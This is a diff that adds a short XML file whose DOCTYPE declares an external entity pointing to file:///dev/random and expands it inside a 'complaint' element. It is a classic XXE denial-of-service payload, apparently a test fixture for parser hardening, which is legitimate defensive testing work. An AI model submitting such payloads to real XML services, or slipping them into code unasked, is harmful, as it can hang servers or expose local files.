@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE complaint [<!ENTITY xxe SYSTEM "file:///dev/random">]>
+<complaint>&xxe;</complaint>
